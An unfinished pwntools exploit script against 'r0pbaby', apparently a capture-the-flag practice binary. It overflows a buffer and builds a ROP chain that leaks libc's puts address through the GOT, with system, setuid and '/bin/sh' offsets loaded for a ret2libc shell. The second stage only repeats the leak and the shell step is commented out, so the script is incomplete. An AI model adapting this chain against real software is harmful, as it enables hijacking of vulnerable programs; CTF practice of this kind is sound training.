from pwn import *

offset = 8

elf = ELF("./r0pbaby")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") 
context.binary = elf

puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
puts_offset = libc.symbols["puts"]
system_offset = libc.symbols["system"]
setuid_offset = libc.symbols["setuid"]
sh_offset = next(libc.search(b"/bin/sh"))

pop_rdi = 0x0000561a60800f23
ret = 0x0000561a60800f24
main = 0x0000000000000a60

payload = b""
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main)

#p = process("./r0pbaby")
p = gdb.debug("./r0pbaby")

p.recvuntil(b": ")
p.sendline(b"3")

p.recvuntil(b": ")
p.sendline(b"41")

p.sendline(b"A" * offset + payload)

p.recvline()
p.recvline()
p.recvline()
p.recvline()
#p.recvline()
p.sendline(b"A" * offset + payload)
p.recvline()

#p.interactive()
